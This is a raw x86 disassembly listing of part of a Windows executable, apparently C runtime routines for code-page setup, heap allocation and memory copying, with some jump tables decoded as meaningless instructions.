  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
